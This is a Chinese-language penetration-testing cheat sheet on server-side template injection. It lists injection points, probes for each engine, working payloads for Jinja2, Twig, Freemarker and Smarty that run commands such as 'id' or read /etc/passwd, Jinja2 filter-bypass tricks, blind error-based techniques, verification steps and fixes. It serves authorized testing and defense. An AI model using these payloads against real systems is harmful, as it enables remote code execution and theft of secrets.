# SSTI（服务端模板注入）

> SSTI 是"用户输入被当作模板语法执行"。它往往直接等于 RCE，因此在授权范围内**只做最小必要验证**（如 `{{7*7}}` 与只读命令），不要执行破坏性操作。

## 一、定位

| 入口 | 说明 |
|---|---|
| 邮件/通知模板 | 用户可控的标题、签名被渲染 |
| PDF/发票生成 | 常基于 HTML→PDF，内嵌模板引擎 |
| 页面标题/描述 | CMS、SEO 字段 |
| 文件名/路径 | 生成静态页时的路径模板 |
| 错误页 | 把用户输入渲染进错误模板 |
| 代码生成器/脚手架 | 表单 → 模板 |

识别：输入 `{{7*7}}`、`${7*7}`、`<%= 7*7 %>`、`#{7*7}`、`{7*7}`，观察是否出现 `49`。

## 二、按引擎分类

| 引擎 | 探测 | 常用利用 |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}`、`{{7*'7'}}` | `{{config}}`、`{{ ''.__class__.__mro__[1].__subclasses__() }}`、`{{ cycler.__init__.__globals__.os.popen('id').read() }}`、`{{ lipsum.__globals__["os"].popen('id').read() }}`、`{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}` |
| Twig (PHP) | `{{7*7}}`、`{{7*'7'}}` | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`（老版本）、`{{ ['id']|filter('system') }}` |
| Freemarker (Java) | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x=7*7)$x` | `#set($e="e")...` 反射链 |
| Smarty (PHP) | `{$smarty.version}` | `{system('id')}`（老版本） |
| Thymeleaf | `${7*7}` | `__${T(java.lang.Runtime)...}__`（预处理表达式） |
| ERB/EJS | `<%= 7*7 %>` | Ruby/Node 全局对象直达 |
| Handlebars | `{{7*7}}`→字面量 | 原型污染 + `{{#with}}` 绕过 |
| Razor (ASP.NET) | `@(7*7)` | 直接 C# 表达式 |
| Jade/Pug | `#{7*7}` | - |

## 三、Jinja2 沙箱绕过（最常见）

1. 关键字过滤（`__`、`class`、`os`、`system`）：用 `request.args` 传入、`attr()` 过滤器、`\x5f\x5f`、`|attr("__class__")`、双写 `__cl__ass__`。
2. 花括号被过滤：用 `{%print(...)%}`、`{{ ... }}` 编码变体、`{% set x=... %}`。
3. `.` 被过滤：`|attr('...')`、`['__class__']`、`|map(attribute=...)`。
4. 引号被过滤：`request.args.a` 或 `dict(...)`、`chr()` 拼接。
5. `os` 不可用：直接从 `subprocess.Popen`、`pty.spawn`、`_io.FileIO` 等子类找替代。
6. 环境受限：`{{config.items()}}`、`{{request.application.__globals__}}` 常能泄漏密钥。

## 四、盲 SSTI（2025 新思路）

无法回显时，**运行时错误**本身可作为通道：

- 把要读的值放进会报错的位置（如作为非法下标/属性名），错误消息里会带出内容。
- 用"是否报错"作为布尔盲注 oracle（无需时间延迟）：`{{ 1 if <condition> else <invalid> }}`。
- 参考 vladko312《Research_Successful_Errors》的 Blind SSTI 方法论。

## 五、验证（最小证据）

1. 数学/字符串运算证据（`49`、`7777777`）证明"模板语法被执行"。
2. 引擎指纹（错误信息、`{{7*'7'}}` 结果差异）。
3. 若声称 RCE：只读证据（`id`、`hostname`、唯一随机串回显或带外命中）。
4. 记录沙箱程度：能否读文件、能否出网。

## 六、常见误报

- 前端 Vue/Angular 在浏览器里计算了 `{{7*7}}` → 那是客户端模板，不是 SSTI。
- 应用把输入做了 HTML 转义但未渲染（渲染结果里没有 `49`）。
- `{{...}}` 原样出现在响应中（未执行）。
- 计算发生在测试工具/预览器侧。

## 七、修复

- 不要把用户输入拼进模板源码；使用"模板 + 数据"分离的 API（`render_template(name, **data)`）。
- 启用沙箱（Jinja2 `SandboxedEnvironment`）并限制可用属性/方法。
- 过滤危险关键字不解决问题，需从架构上禁止动态模板。
- 模板渲染进程最小权限、无凭据、限制出网。

## 参考

- PortSwigger Server-Side Template Injection
- PayloadsAllTheThings：SSTI / Jinja2
- vladko312：Blind SSTI / Research_Successful_Errors（2025）
